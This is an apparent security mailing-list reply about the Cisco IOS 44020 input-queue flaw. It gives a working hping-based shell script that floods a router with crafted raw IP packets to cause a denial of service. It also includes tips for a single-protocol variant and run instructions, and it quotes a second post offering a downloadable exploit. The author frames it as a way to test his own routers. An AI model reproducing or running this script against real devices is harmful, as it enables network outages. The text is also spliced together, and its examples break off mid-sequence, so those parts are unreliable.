Subject: RE: Cisco IOS exploit (44020)


Here's a much simpler shell script that produces the same result:

--- BEGIN SHELL SCRIPT ---
#!/bin/tcsh -f

if ($1 == "" || $2 == "") then
  echo "usage: $0 <router hostname|address> <ttl>"
  exit
endif

foreach protocol (53 55 77 103)
    /usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto
$protocol --count 19 --interval u250 --data 26
end
--- END SHELL SCRIPT ---

There's little reason to compile source code that will be run as root if
the same thing can be accomplished with a tool that has been used and
trusted by systems administrators for quite some time. Hping can be
found at http://www.hping.org and "is a command-line oriented TCP/IP
packet assembler/analyzer".

Before upgrading my routers, I wrote this script to confirm that they
were indeed vulnerable. As you can see, the script iterates over the
various protocols (SWIPE, IP Mobility, Sun ND, PIM) and sends 19 packets
each using hping for a total of 76 (one more than needed to fill up the
input queue). 

What is interesting to note is that the input queue on the interface can
be exploited using just one of the vulnerable protocols; try changing
the "foreach protocol (53 55 77 103)" line to "foreach protocol (53)"
and then changing the "--count 19" parameter to "--count 76". When I
first read the security advisory I thought that Cisco had tried to make
it seem that all 4 were necessary.

You must be able to open raw sockets so either run the script as root or
set the suid bit. The syntax is: ./exploit.sh <hostname|address> <ttl>
where <hostname|address> is the hostname or IP address of the vulnerable
Cisco IOS device and <ttl> is the TTL subtracted by 255. 

Here is an example:

> ping 192.168.1.1
PING 192.168.1.1 (192.168.1.1): 56 data bytes

And finally, from the console:

Hi,

I'd like to submit a DoS attack against the recently found bug in
almost all Cisco IOS versions (Cisco document ID 44020).

The exploit can be found here (and it is included as attachment):

http://www.elxsi.de/cisco-bug-44020.tar.gz


This exploit is NOT broken (like the shadowchode.tar.gz exploit for
example):

Example:

bash-2.05b# telnet 192.168.1.123
Trying 192.168.1.123...
Connected to 192.168.1.123.
